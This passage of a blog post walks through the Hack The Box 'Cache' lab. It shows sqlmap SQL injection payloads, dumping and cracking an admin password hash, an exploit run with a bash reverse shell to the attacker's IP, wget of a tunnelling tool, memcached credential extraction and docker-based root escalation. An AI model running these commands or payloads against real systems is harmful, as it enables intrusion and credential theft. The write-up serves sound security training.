+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> is <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span> injectable 
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL inline queries&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries (comment)&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> time-based comparison requires larger statistical model, please wait... <span style="color:#f92672">(</span><span style="color:#66d9ef">done</span><span style="color:#f92672">)</span>                                                                                                                                       
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries&#39;</span>
+<span style="color:#f92672">[</span>20:38:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#39;</span>
+<span style="color:#f92672">[</span>20:38:43<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#39;</span>
+<span style="color:#f92672">[</span>20:38:43<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#39;</span>
+<span style="color:#f92672">[</span>20:38:43<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;</span>
+<span style="color:#f92672">[</span>20:38:43<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
+<span style="color:#f92672">[</span>20:38:53<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> appears to be <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span> injectable 
+<span style="color:#f92672">[</span>20:38:53<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span style="color:#f92672">[</span>20:38:53<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> automatically extending ranges <span style="color:#66d9ef">for</span> UNION query injection technique tests as there is at least one other <span style="color:#f92672">(</span>potential<span style="color:#f92672">)</span> technique found
+<span style="color:#f92672">[</span>20:38:54<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;ORDER BY&#39;</span> technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range <span style="color:#66d9ef">for</span> current UNION query injection technique test
+<span style="color:#f92672">[</span>20:38:54<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> target URL appears to have <span style="color:#ae81ff">4</span> columns in query
+<span style="color:#f92672">[</span>20:38:54<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> is <span style="color:#e6db74">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
+GET parameter <span style="color:#e6db74">&#39;eid&#39;</span> is vulnerable. Do you want to keep testing the others <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> any<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> 
+sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">46</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
+---
+Parameter: eid <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>original value<span style="color:#f92672">)</span>
+    Payload: eid<span style="color:#f92672">=(</span>SELECT <span style="color:#f92672">(</span>CASE WHEN <span style="color:#f92672">(</span>2161<span style="color:#f92672">=</span>2161<span style="color:#f92672">)</span> THEN 0x2d31 ELSE <span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">3529</span> UNION SELECT 3223<span style="color:#f92672">)</span> END<span style="color:#f92672">))</span>
+
+    Type: error-based
+    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span style="color:#f92672">(</span>EXTRACTVALUE<span style="color:#f92672">)</span>
+    Payload: eid<span style="color:#f92672">=</span>-1 AND EXTRACTVALUE<span style="color:#f92672">(</span>5916,CONCAT<span style="color:#f92672">(</span>0x5c,0x717a6b7071,<span style="color:#f92672">(</span>SELECT <span style="color:#f92672">(</span>ELT<span style="color:#f92672">(</span>5916<span style="color:#f92672">=</span>5916,1<span style="color:#f92672">)))</span>,0x71706a6a71<span style="color:#f92672">))</span>
+
+    Type: time-based blind
+    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 AND time-based blind <span style="color:#f92672">(</span>query SLEEP<span style="color:#f92672">)</span>
+    Payload: eid<span style="color:#f92672">=</span>-1 AND <span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">3259</span> FROM <span style="color:#f92672">(</span>SELECT<span style="color:#f92672">(</span>SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)))</span>eVqd<span style="color:#f92672">)</span>
+
+    Type: UNION query
+    Title: Generic UNION query <span style="color:#f92672">(</span>NULL<span style="color:#f92672">)</span> - <span style="color:#ae81ff">4</span> columns
+    Payload: eid<span style="color:#f92672">=</span>-1 UNION ALL SELECT NULL,NULL,CONCAT<span style="color:#f92672">(</span>0x717a6b7071,0x4c78526f76514b4552714c6f596873486f64554561686e68704946414d4e54415453725142684e6a,0x71706a6a71<span style="color:#f92672">)</span>,NULL-- -
+---
+<span style="color:#f92672">[</span>20:39:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.1
+<span style="color:#f92672">[</span>20:39:02<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/u915/.local/share/sqlmap/output/hms.htb&#39;</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 20:39:02 /2020-08-03/
+
+<span style="color:#f92672">[</span>20:42:00<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.1
+<span style="color:#f92672">[</span>20:42:00<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching database names
+<span style="color:#f92672">[</span>20:42:00<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;information_schema&#39;</span>
+<span style="color:#f92672">[</span>20:42:00<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;openemr&#39;</span>
+available databases <span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>:                                                                                                                                                                                                                  
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> openemr
+
+</code></pre></div><p>Great, can be exploited. The backend is MySQL and there are 2 databases openemr and information_schema</p>
+<h3 id="extracting-the-data">Extracting the data</h3>
+<p>Next step i to dump useful data:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r request.txt --tables -D openemr
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">+---------------------------------------+
+| array                                 |
+| groups                                |
+| sequences                             |
+| version                               |
+
+<span style="color:#f92672">[</span>... Redacted because was too long<span style="color:#f92672">]</span>
+
+| therapy_groups_participants           |
+| transactions                          |
+| user_settings                         |
+| users                                 |
+| users_facility                        |
+| users_secure                          |
+| valueset                              |
+| voids                                 |
+| x12_partners                          |
++---------------------------------------+
+</code></pre></div><p>A lot of stuff here, but I want the juicy users and passwords:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r request.txt --dump -D openemr -T users
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>u915<span style="color:#f92672">/</span>.<span style="color:#66d9ef">local</span><span style="color:#f92672">/</span><span style="color:#66d9ef">share</span><span style="color:#f92672">/</span>sqlmap<span style="color:#f92672">/</span><span style="color:#66d9ef">output</span><span style="color:#f92672">/</span>hms.htb<span style="color:#f92672">/</span>dump<span style="color:#f92672">/</span>openemr<span style="color:#f92672">/</span>users.csv
+
+<span style="color:#66d9ef">Database</span>: openemr
+<span style="color:#66d9ef">Table</span>: users_secure
+[<span style="color:#ae81ff">1</span> entry]
+<span style="color:#f92672">+</span><span style="color:#75715e">------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> id   <span style="color:#f92672">|</span> salt                           <span style="color:#f92672">|</span> username      <span style="color:#f92672">|</span> password                                                     <span style="color:#f92672">|</span> last_update         <span style="color:#f92672">|</span> salt_history1 <span style="color:#f92672">|</span> salt_history2 <span style="color:#f92672">|</span> password_history1 <span style="color:#f92672">|</span> password_history2 <span style="color:#f92672">|</span>
+<span style="color:#f92672">+</span><span style="color:#75715e">------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+</span><span style="color:#75715e"></span><span style="color:#f92672">|</span> <span style="color:#ae81ff">1</span>    <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$05$l2sTLIG6GTBeyBf7TAKL6A$ <span style="color:#f92672">|</span> openemr_admin <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. <span style="color:#f92672">|</span> <span style="color:#ae81ff">2019</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">38</span>:<span style="color:#ae81ff">40</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>          <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>          <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>              <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>              <span style="color:#f92672">|</span>
+<span style="color:#f92672">+</span><span style="color:#75715e">------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+</span><span style="color:#75715e"></span>
+[<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">37</span>] [INFO] <span style="color:#66d9ef">table</span> <span style="color:#e6db74">&#39;openemr.users_secure&#39;</span> dumped <span style="color:#66d9ef">to</span> CSV file <span style="color:#e6db74">&#39;/home/u915/.local/share/sqlmap/output/hms.htb/dump/openemr/users_secure.csv&#39;</span>
+[<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">37</span>] [INFO] fetched <span style="color:#66d9ef">data</span> logged <span style="color:#66d9ef">to</span> text files <span style="color:#66d9ef">under</span> <span style="color:#e6db74">&#39;/home/u915/.local/share/sqlmap/output/hms.htb&#39;</span>
+
+[<span style="color:#f92672">*</span>] ending <span style="color:#f92672">@</span> <span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">37</span> <span style="color:#f92672">/</span><span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#f92672">/</span>
+
+</code></pre></div><p>Ok, so username is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openemr_admin
+</code></pre></div><p>and the password hash is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
+</code></pre></div><h3 id="cracking-the-hash-with-john">Cracking the hash with John</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>bcrypt <span style="color:#f92672">[</span>Blowfish 32/64 X3<span style="color:#f92672">])</span>
+Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">32</span> <span style="color:#66d9ef">for</span> all loaded hashes
+Will run <span style="color:#ae81ff">2</span> OpenMP threads
+Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+xxxxxx           <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-08-03 20:54<span style="color:#f92672">)</span> 2.439g/s 2063p/s 2063c/s 2063C/s tristan..princesita
+Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><p>hummm the password is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xxxxxx
+</code></pre></div><p>Using the password to log in i discovered the real version of EMR, i tried on the beginning to use exploits but did not work because the version and patching:</p>
+<p><img src="/images/posts/htb_cache_8.png" alt="alt text" title="HTB Cache Dirbuster against EMR"></p>
+<p>But&hellip; there is another authenticated RCE exploit:</p>
+<p><a href="https://www.exploit-db.com/exploits/45161">https://www.exploit-db.com/exploits/45161</a></p>
+<p>All that I need is to use the working cracked password and username that I used to log in on EMR:</p>
+<p><em>openemr_admin/xxxxxx</em></p>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>Upgrade the shell, because working on the webshell is hard:</p>
+<p>Listener on my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">1337</span>
+</code></pre></div><p>Exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python 45161.py -u <span style="color:#e6db74">&#34;openemr_admin&#34;</span> -p <span style="color:#e6db74">&#34;xxxxxx&#34;</span> -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.11/1337 0&gt;&amp;1&#39;</span> http://hms.htb/
+
+</code></pre></div><p>Worked!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">connect to <span style="color:#f92672">[</span>10.10.14.11<span style="color:#f92672">]</span> from cache.htb <span style="color:#f92672">[</span>10.10.10.188<span style="color:#f92672">]</span> <span style="color:#ae81ff">33772</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>1884<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+www-data@cache:/var/www/hms.htb/public_html/interface/main$ 
+</code></pre></div><p>But is a bad shell&hellip;</p>
+<p>First I upgraded to shell with Python to be more interactive:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@cache:/var/www/hms.htb/public_html/interface/main$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>       
+&lt;in$ python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>     
+</code></pre></div><h3 id="user-ash-and-flag">User Ash and flag</h3>
+<p>Now I can use the previous credentials, <em>ash/H@v3_fun</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@cache:/var/www/hms.htb/public_html/interface/main$ su ash
+su ash
+Password: H@v3_fun
+</code></pre></div><p>Getting the user flag inside <em>/home/ash</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat user.txt
+0f2XXXXXXe37
+</code></pre></div><h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
+<p>Now is time to scalate priveleges.</p>
+<h3 id="sudo">Sudo</h3>
+<p>Testing sudo:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@cache:~$ sudo -l
+sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> ash: H@v3_fun
+
+Sorry, user ash may not run sudo on cache.
+</code></pre></div><p>Bad luck no sudo enabled.</p>
+<h3 id="processes">Processes</h3>
+<p>Checking the processes running inside the machine I discovered the juicy docker (but Ash can not manage it) and also memcached.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">memcache  <span style="color:#ae81ff">1109</span>  0.0  0.1 <span style="color:#ae81ff">425792</span>  <span style="color:#ae81ff">4152</span> ?        Ssl  Aug02   0:19 /usr/bin/memcached -m <span style="color:#ae81ff">64</span> -p <span style="color:#ae81ff">11211</span> -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
+root      <span style="color:#ae81ff">1110</span>  0.1  1.7 <span style="color:#ae81ff">938776</span> <span style="color:#ae81ff">69084</span> ?        Ssl  Aug02   1:59 /usr/bin/dockerd -H fd://
+root      <span style="color:#ae81ff">1116</span>  0.0  0.1  <span style="color:#ae81ff">72300</span>  <span style="color:#ae81ff">6440</span> ?        Ss   Aug02   0:00 /usr/sbin/sshd -D
+root      <span style="color:#ae81ff">1117</span>  0.0  1.0 <span style="color:#ae81ff">956812</span> <span style="color:#ae81ff">40540</span> ?        Ssl  Aug02   0:08 /usr/bin/containerd
+root      <span style="color:#ae81ff">1156</span>  0.0  0.1 <span style="color:#ae81ff">288884</span>  <span style="color:#ae81ff">6468</span> ?        Ssl  Aug02   0:02 /usr/lib/policykit-1/polkitd --no-debug
+root      <span style="color:#ae81ff">1223</span>  0.0  0.0  <span style="color:#ae81ff">14888</span>  <span style="color:#ae81ff">1968</span> tty1     Ss+  Aug02   0:00 /sbin/agetty -o -p -- <span style="color:#ae81ff">\u</span> --noclear tty1 linux
+
+</code></pre></div><h3 id="memcache-extraction">Memcache extraction</h3>
+<p>Using the Metasploit module to extract credentials:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary<span style="color:#f92672">(</span>gather/memcached_extractor<span style="color:#f92672">)</span> &gt; show options
+
+Module options <span style="color:#f92672">(</span>auxiliary/gather/memcached_extractor<span style="color:#f92672">)</span>:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+   RPORT    <span style="color:#ae81ff">11211</span>            yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+   THREADS  <span style="color:#ae81ff">1</span>                yes       The number of concurrent threads <span style="color:#f92672">(</span>max one per host<span style="color:#f92672">)</span>
+</code></pre></div><p>But firts i did a port fordwarding with Chisel:</p>
+<p>Using python http.server on my machine to delivery Chisel:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server <span style="color:#ae81ff">8001</span>
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8001</span> <span style="color:#f92672">(</span>http://0.0.0.0:8001/<span style="color:#f92672">)</span> ...
+10.10.10.188 - - <span style="color:#f92672">[</span>03/Aug/2020 21:53:54<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /chisel HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</code></pre></div><p>on the HTB box:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget 10.10.14.11:8001/chisel
+</code></pre></div><p>Port enabled:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel server -p <span style="color:#ae81ff">9003</span> --reverse
+2020/08/03 21:51:14 server: Reverse tunnelling enabled
+2020/08/03 21:51:14 server: Fingerprint 6c:26:25:39:1c:cf:12:97:9a:d0:d4:04:1b:4b:76:8a
+2020/08/03 21:51:14 server: Listening on 0.0.0.0:9003...
+
+ash@cache:~/.local/chisel$ ./chisel client 10.10.14.11:9003 R:11211:127.0.0.1:11211
+&lt;sel client 10.10.14.11:9003 R:11211:127.0.0.1:11211
+2020/08/03 19:55:38 client: Connecting to ws://10.10.14.11:9003
+2020/08/03 19:55:38 client: Fingerprint 6c:26:25:39:1c:cf:12:97:9a:d0:d4:04:1b:4b:76:8a
+2020/08/03 19:55:38 client: Connected <span style="color:#f92672">(</span>Latency 42.81155ms<span style="color:#f92672">)</span>
+</code></pre></div><p>Now I can easy use Metasploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 auxiliary<span style="color:#f92672">(</span>gather/memcached_extractor<span style="color:#f92672">)</span> &gt; exploit
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 127.0.0.1:11211       - Found <span style="color:#ae81ff">4</span> keys
+
+Keys/Values Found <span style="color:#66d9ef">for</span> 127.0.0.1:11211
+<span style="color:#f92672">=====================================</span>
+
+ Key      Value
+ ---      -----
+ account  <span style="color:#e6db74">&#34;VALUE account 0 9\r\nafhj556uo\r\nEND\r\n&#34;</span>
+ file     <span style="color:#e6db74">&#34;VALUE file 0 7\r\nnothing\r\nEND\r\n&#34;</span>
+ passwd   <span style="color:#e6db74">&#34;VALUE passwd 0 9\r\n0n3_p1ec3\r\nEND\r\n&#34;</span>
+ user     <span style="color:#e6db74">&#34;VALUE user 0 5\r\nluffy\r\nEND\r\n&#34;</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 127.0.0.1:11211       - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</code></pre></div><p>Great new credentials:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luffy/0n3_p1ec3
+</code></pre></div><h3 id="log-in-as-luffy">Log in as luffy</h3>
+<p>Now I can use the credentials to log in as luffy on the system.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luffy@cache:/var/www/hms.htb/public_html/interface/main$ id
+id
+uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>luffy<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>luffy<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>luffy<span style="color:#f92672">)</span>,999<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
+</code></pre></div><p>Good, luffy has the group docker.</p>
+<h3 id="root-and-flag">Root and flag</h3>
+<p>Docker is a GTFO bin so lets go:</p>
+<p><a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        <span style="color:#ae81ff">10</span> months ago       64.2MB
+</code></pre></div><p>The docker repo is <em>ubuntu</em>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+&lt;cker run -v /:/mnt --rm -it ubuntu chroot /mnt bash     
+</code></pre></div><p>Rooted.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@92a12207d8d2:/# whoami
+whoami
+root
+</code></pre></div><p>Finally, getting the root flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@92a12207d8d2:/# cat /root/root.txt
+cat /root/root.txt
+e6ec<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>d37c
+</code></pre></div><p>Thanks for reading!</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
+    <div>© 2020 — u915 — <a href="/license/">License</a></div>
+  </div>
+</footer>
+</body>
+</html>
